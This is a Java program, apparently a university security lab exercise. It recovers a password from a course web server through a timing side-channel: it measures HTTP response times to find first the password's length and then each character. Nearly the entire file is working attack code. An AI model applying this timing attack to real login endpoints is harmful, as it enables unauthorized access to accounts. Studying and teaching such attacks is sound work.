

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;	
import java.net.*;

public class ex01_M2 {

	static final String URL = "http://aoi.ise.bgu.ac.il/?user=305555179&password=";
	static final String CURL_CMD_START = "curl -s -w \\n%{time_total} -o - ";
	static final String DIFFICULTY = "&difficulty=";

	final static char[] LETTERS = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};

	/**
	 * @param args
	 */
	public static void main(String[] args) throws Exception {
		int difficulty = 100000;
		int attempts = 7;

		double nanoInSec = 1000000000;
		//		int len = findPasswordLength(3, difficulty);
		//		System.out.println("password length: "+len);
		double start = System.nanoTime();
		System.out.println(">>>> attempts: "+attempts+" difficullty: "+difficulty);
		String passwd = findPassword(attempts, difficulty); 
		System.out.println(">>>> the password is: "+passwd);
		double end = System.nanoTime();
		System.out.println(">>>> It took: "+(end-start)/nanoInSec+" seconds");
		//...
		//System.out.println(username + " " + password + " " + difficulty);
		//...
		//System.out.println("We have a problem");
	}

	public static int findPasswordLength(int attempts, int difficulty) {
		int len = 0;
		double maxReqTime = 0;
		int maxLen = 32;
		double[] reqTimes = new double[maxLen];
		double curReqTime = 0;
		double globalMin = Double.MAX_VALUE;
		double thresh = 1.5;
		String passwd;
		
		for (int i = 0; i < maxLen; i++) {
			reqTimes[i] = Double.MAX_VALUE;
		}
		
		for (int i = 0; i < attempts; i++) {
			 passwd = "";
			for (int j = 0; j < maxLen; j++) {
				passwd += "a";
				curReqTime = getReqTime(URL+passwd+DIFFICULTY+difficulty);
				reqTimes[j] = Math.min(reqTimes[j], curReqTime);
//				System.out.println("attempt: "+i+" length: "+(j+1)+" reqTime: "+reqTimes[j]);
			}
			
		}

		for (int i = 0; i < maxLen; i++) {
			globalMin = Math.min(reqTimes[i], globalMin);
		}

		
		passwd ="";	
		for (int i = 0; i < maxLen; i++) {
			passwd += "a";
			while(reqTimes[i] > thresh*globalMin) {
				reqTimes[i] = getReqTime(URL+passwd+DIFFICULTY+difficulty);
				System.out.println("retry length: "+(i+1)+" new reqTime:: "+reqTimes[i]+" min: "+globalMin+" thresh*min: "+(thresh*globalMin));		
			}
		}

		for (int i = 0; i < maxLen; i++) {
			System.out.println("length: "+(i+1)+" reqTime: "+reqTimes[i]);
			if (maxReqTime < reqTimes[i]) {
				maxReqTime = reqTimes[i];
				len = i+1;
			}
		}
		
		System.out.println(">> passwd length: "+len);
		return len;
	}

	public static String findPassword(int attempts, int difficulty) {

		int len = findPasswordLength(attempts, difficulty);
		int lettersLen = LETTERS.length;
		double maxReqTime = 0;
		double[] reqTimes = new double[lettersLen];
		double curReqTime = 0;
		double globalMin;
		char curChar = '0';
		String passwd = "";
		String passSuff = new String(new char[len-(passwd.length()+1)]).replace('\0', '0');
		double thresh = 1.1;
			
		for (int i = passwd.length(); i < len-1; i++) {
			
			maxReqTime = 0;
			globalMin = Double.MAX_VALUE;
			
			for (int j = 0; j < lettersLen; j++) {
				reqTimes[j] = Double.MAX_VALUE;
			}
			
			for (int j = 0; j < attempts; j++) {
				for (int k = 0; k < lettersLen; k++) {
					curReqTime = getReqTime(URL+passwd+LETTERS[k]+passSuff+DIFFICULTY+difficulty);
					reqTimes[k] = Math.min(reqTimes[k], curReqTime);
//					System.out.println("attempt: "+j+" passwd: "+passwd+LETTERS[k]+passSuff+" reqTime: "+curReqTime);
				}
				
			}

			for (int j = 0; j < lettersLen; j++) {
				globalMin = Math.min(globalMin, reqTimes[j]);
			}

			for (int j = 0; j < lettersLen; j++) {
				while(reqTimes[j] > thresh*globalMin) {
					System.out.println("req "+LETTERS[j]+": "+reqTimes[j]+" min: "+globalMin+" thresh*min: "+thresh*globalMin);
					reqTimes[j] = getReqTime(URL+passwd+LETTERS[j]+passSuff+DIFFICULTY+difficulty);
					System.out.println("retry "+LETTERS[j]+": "+reqTimes[j]);
				}
			}
			
			for (int j = 0; j < lettersLen; j++) {
				System.out.println(">> passwd: "+passwd+LETTERS[j]+passSuff+" reqTime: "+reqTimes[j]);
				if (maxReqTime < reqTimes[j]) {
					maxReqTime = reqTimes[j];
					curChar = LETTERS[j];
				}
			}
			
			passwd += curChar;
			passSuff = passSuff.substring(1);
			System.out.println(">>> passwd: "+passwd);
		}
		
		boolean res;
		for (int i = 0; i < lettersLen; i++) {
			res = sendReq(URL+passwd+LETTERS[i]+DIFFICULTY+difficulty);
			System.out.println("passwd: "+passwd+LETTERS[i]+" res: "+res);
			if(res) {
				passwd+=LETTERS[i];
				return passwd;
			}
		}
		
		return "";
	}
	
	
	public static boolean sendReq(String urlString) {
		URL url;
		URLConnection conn;
		BufferedReader stdInput;
		
		try {
			url = new URL(urlString);
			conn = url.openConnection();
			stdInput = new BufferedReader(new InputStreamReader(conn.getInputStream()));

			boolean res = stdInput.readLine().equals("1");
			stdInput.close();

			return res;

		} catch (Exception e) {
			e.printStackTrace();
		}
		return false;
	}

	
	public static double getReqTime(String urlString) {
		return getReqTimeNano(urlString);
		//return (double)getReqTimeCurl(urlString);
	}

	public static double getReqTimeNano(String urlString) {
		double start;
		double end;
		URL url;
		HttpURLConnection conn = null;
		
		try {
			
			url = new URL(urlString);
			conn = (HttpURLConnection)url.openConnection();
			
			start = System.nanoTime();
			//conn.connect();
			conn.getInputStream();
			end = System.nanoTime();
			
			return end - start;

		} catch (Exception e) {
			e.printStackTrace();
		}finally {
			conn.disconnect();
		}
		try {
			TimeUnit.SECONDS.sleep(3);
		}
		catch (Exception e){
			e.printStackTrace();
		}
		return getReqTime(urlString);
	}
	
	public static double getReqTimeCurl(String url) {

		String curl_cmd = CURL_CMD_START + url;
		String res = "";
		double time = Double.MAX_VALUE;
		
		try {
			Process process = Runtime.getRuntime().exec(curl_cmd);
			BufferedReader stdInput = new BufferedReader(new InputStreamReader(process.getInputStream()));
			
			res = stdInput.readLine();
			time = Double.parseDouble(stdInput.readLine());
			
			process.destroy();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return time;
	}
}

